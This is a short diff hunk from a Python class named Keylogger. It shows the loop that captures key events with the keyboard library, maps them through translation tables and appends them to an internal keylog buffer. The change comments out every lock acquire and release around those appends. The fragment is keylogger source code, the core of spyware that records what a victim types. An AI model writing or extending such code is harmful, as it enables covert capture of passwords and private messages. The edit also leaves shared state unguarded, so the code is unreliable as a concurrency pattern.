@@ -103,24 +103,24 @@ class Keylogger:
                 if event.name in ["shift", "backspace"]:
                     continue
                 elif event.name in TRANSLATION_TABLE.keys():
-                    self.__lock.acquire()
+                    # self.__lock.acquire()
                     self.__keylog += TRANSLATION_TABLE[event.name]
-                    self.__lock.release()
+                    # self.__lock.release()
                     continue
                 elif event.name in SHIFT_MODIFIER_TABLE.keys():
                     if keyboard.is_pressed("shift"):
-                        self.__lock.acquire()
+                        # self.__lock.acquire()
                         self.__keylog += SHIFT_MODIFIER_TABLE[event.name]
-                        self.__lock.release()
+                        # self.__lock.release()
                     else:
-                        self.__lock.acquire()
+                        # self.__lock.acquire()
                         self.__keylog += event.name
-                        self.__lock.release()
+                        # self.__lock.release()
                     continue
                 else:
-                    self.__lock.acquire()
+                    # self.__lock.acquire()
                     self.__keylog += event.name
-                    self.__lock.release()
+                    # self.__lock.release()
                     continue
         self.__active = False
 
